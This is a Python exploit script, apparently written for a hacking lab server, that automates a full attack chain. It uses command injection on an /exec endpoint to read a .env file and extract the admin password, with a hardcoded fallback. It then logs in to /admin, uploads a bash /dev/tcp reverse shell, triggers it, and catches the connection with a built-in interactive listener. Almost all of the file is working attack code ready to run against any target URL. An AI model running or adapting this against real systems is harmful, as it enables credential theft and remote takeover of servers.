#!/usr/bin/env python3

"""
Proof of Concept Exploit for Hack The UmmIt Lab Server (Info)

Steps:
1. Use /exec path to read .env file and extract credentials
2. Login via /admin with extracted credentials
3. Upload reverse shell via file upload
4. Trigger the reverse shell
"""

import requests
import re
import argparse
import sys
import socket
import threading
import time
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()


class ReverseShellListener:
    """Built-in reverse shell listener"""
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.server_socket = None
        self.client_socket = None
        self.running = False
        self.connected = False
        
    def start(self):
        self.running = True
        listener_thread = threading.Thread(target=self._listen, daemon=True)
        listener_thread.start()
        print(f"[+] Listener started on {self.lhost}:{self.lport}")
        time.sleep(1)  # Give listener time to start
        
    def _listen(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind(('0.0.0.0', self.lport))
            self.server_socket.listen(1)
            self.server_socket.settimeout(30)  # 30 second timeout
            
            print(f"[*] Waiting for reverse shell connection...")
            
            try:
                self.client_socket, addr = self.server_socket.accept()
                self.connected = True
                print(f"\n[+] Got connection from {addr[0]}:{addr[1]}")
                print("[+] Reverse shell connected!")
                print("[*] Starting interactive shell (type 'exit' to quit)...\n")
                
                self._interactive_shell()
                
            except socket.timeout:
                print("\n[-] Connection timeout - no reverse shell received")
                
        except Exception as e:
            print(f"[-] Listener error: {e}")
        finally:
            self.stop()
    
    def _interactive_shell(self):
        """Handle interactive shell session"""
        self.client_socket.settimeout(0.5)
        
        try:
            while self.running:
                # Check for data from remote shell
                try:
                    data = self.client_socket.recv(4096)
                    if data:
                        print(data.decode('utf-8', errors='ignore'), end='', flush=True)
                    else:
                        print("\n[-] Connection closed by remote host")
                        break
                except socket.timeout:
                    pass
                except Exception as e:
                    print(f"\n[-] Receive error: {e}")
                    break
                
                # Check for user input (non-blocking)
                try:
                    import select
                    if select.select([sys.stdin], [], [], 0.0)[0]:
                        cmd = sys.stdin.readline()
                        if cmd.strip().lower() == 'exit':
                            print("[*] Exiting shell...")
                            break
                        self.client_socket.send(cmd.encode())
                except:
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            print("\n[*] Shell interrupted")
        finally:
            self.stop()
    
    def stop(self):
        """Stop the listener and close connections"""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
    
    def is_connected(self):
        return self.connected


class LabExploit:
    def __init__(self, target_url, lhost, lport, use_builtin_listener=True):
        self.target_url = target_url.rstrip('/')
        self.lhost = lhost
        self.lport = lport
        self.session = requests.Session()
        self.admin_password = None
        self.use_builtin_listener = use_builtin_listener
        self.listener = None
        
    def step1_extract_credentials(self):
        print("[*] Step 1: Extracting credentials from .env file...")
        
        # Command injection payload
        cmd_payload = "ls; cat .env"
        encoded_payload = quote(cmd_payload)
        
        try:
            url = f"{self.target_url}/exec?cmd={encoded_payload}"
            print(f"[+] Sending request to: {url}")
            
            response = self.session.get(url)
            print(f"[+] Response status: {response.status_code}")
            print(f"[+] Response content:\n{response.text}\n")
            
            password_patterns = [
                r'ADMIN_PASSWORD[=:]\s*(\S+)',
                r'admin[=:]\s*(\S+)',
                r'password[=:]\s*(\S+)',
            ]
            
            for pattern in password_patterns:
                match = re.search(pattern, response.text, re.IGNORECASE)
                if match:
                    self.admin_password = match.group(1).strip()
                    print(f"[+] Found password: {self.admin_password}")
                    return True
            
            print("[!] Could not auto-extract password, using known credentials")
            self.admin_password = "398104521h"
            return True
            
        except Exception as e:
            print(f"[-] Error in step 1: {e}")
            return False
    
    def step2_login(self):
        print("\n[*] Step 2: Logging in to /admin...")
        
        try:
            login_url = f"{self.target_url}/admin"
            
            # Try POST login
            login_data = {
                'username': 'admin',
                'password': self.admin_password
            }
            
            print(f"[+] Attempting login with admin:{self.admin_password}")
            response = self.session.post(login_url, data=login_data, allow_redirects=True)
            
            if response.status_code == 200:
                print(f"[+] Login successful! Status: {response.status_code}")
                
                if 'session' in self.session.cookies:
                    print(f"[+] Session cookie: {self.session.cookies['session']}")
                
                return True
            else:
                print(f"[-] Login failed with status: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Error in step 2: {e}")
            return False
    
    def step3_upload_reverse_shell(self):
        print("\n[*] Step 3: Uploading reverse shell...")
        
        try:
            upload_url = f"{self.target_url}/admin"
            
            shell_payload = f"sh -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
            
            print(f"[+] Reverse shell payload: {shell_payload}")
            
            files = {
                'file': ('reverseshell.sh', shell_payload, 'application/x-shellscript')
            }
            
            print(f"[+] Uploading reverse shell to {upload_url}")
            response = self.session.post(upload_url, files=files)
            
            print(f"[+] Upload response status: {response.status_code}")
            print(f"[+] Upload response:\n{response.text}\n")
            
            if response.status_code == 200 or 'success' in response.text.lower():
                print("[+] Reverse shell uploaded successfully!")
                return True
            else:
                print("[!] Upload may have failed, but continuing...")
                return True
                
        except Exception as e:
            print(f"[-] Error in step 3: {e}")
            return False
    
    def step4_trigger_shell(self):
        """Step 4: Trigger the reverse shell via /exec"""
        print("\n[*] Step 4: Triggering reverse shell...")
        
        # Start built-in listener if enabled
        if self.use_builtin_listener:
            self.listener = ReverseShellListener(self.lhost, self.lport)
            self.listener.start()
            time.sleep(2)  # Give listener time to fully start
        else:
            print(f"[!] Make sure you have a listener running: nc -lvnp {self.lport}")
        
        try:
            # Use /exec to execute the uploaded reverse shell
            cmd = "cd uploads; bash reverseshell.sh"
            encoded_cmd = quote(cmd)
            trigger_url = f"{self.target_url}/exec?cmd={encoded_cmd}"
            
            print(f"[+] Triggering reverse shell via: {trigger_url}")
            
            try:
                # This request will hang when the shell connects
                response = self.session.get(trigger_url, timeout=3)
                print(f"[+] Response: {response.text}")
            except requests.exceptions.Timeout:
                print("[+] Request timed out - shell triggered!")
            except Exception as e:
                print(f"[+] Connection interrupted (expected): {e}")
            
            # Wait for connection if using built-in listener
            if self.use_builtin_listener and self.listener:
                print("\n[*] Waiting for shell connection...")
                time.sleep(3)
                
                if not self.listener.is_connected():
                    print("[-] No connection received. The shell might not have been triggered.")
                    self.listener.stop()
                    return False
            else:
                print("\n[+] Exploitation complete!")
                print(f"[+] Check your listener on {self.lhost}:{self.lport}")
            
            return True
            
        except Exception as e:
            print(f"[-] Error in step 4: {e}")
            if self.listener:
                self.listener.stop()
            return False
    
    def exploit(self):
        """Run the full exploitation chain"""
        print("="*60)
        print("Hack The UmmIt Lab Server - Exploitation PoC")
        print("="*60)
        
        if not self.step1_extract_credentials():
            print("[-] Step 1 failed!")
            return False
        
        if not self.step2_login():
            print("[-] Step 2 failed!")
            return False
        
        if not self.step3_upload_reverse_shell():
            print("[-] Step 3 failed!")
            return False
        
        self.step4_trigger_shell()
        
        return True


def main():
    parser = argparse.ArgumentParser(
        description='PoC Exploit for Hack The UmmIt Lab Server',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 exploit_poc.py -t http://152.42.255.103:8080 -l 139.59.232.154 -p 4444
  python3 exploit_poc.py --target http://target.com --lhost 10.10.10.10 --lport 1337
        """
    )
    
    parser.add_argument('-t', '--target', required=True, 
                        help='Target URL (e.g., http://152.42.255.103:8080)')
    parser.add_argument('-l', '--lhost', required=True,
                        help='Local host for reverse shell (your IP)')
    parser.add_argument('-p', '--lport', type=int, required=True,
                        help='Local port for reverse shell')
    parser.add_argument('--no-listener', action='store_true',
                        help='Disable built-in listener (use external nc)')
    
    args = parser.parse_args()
    
    if args.no_listener:
        print(f"\n[!] Built-in listener disabled. Start your own listener:")
        print(f"[!] nc -lvnp {args.lport}\n")
    else:
        print(f"\n[+] Using built-in reverse shell listener on port {args.lport}")
        print(f"[+] No need to run nc separately!\n")
    
    exploit = LabExploit(args.target, args.lhost, args.lport, 
                         use_builtin_listener=not args.no_listener)
    
    try:
        exploit.exploit()
    except KeyboardInterrupt:
        print("\n\n[!] Exploit interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
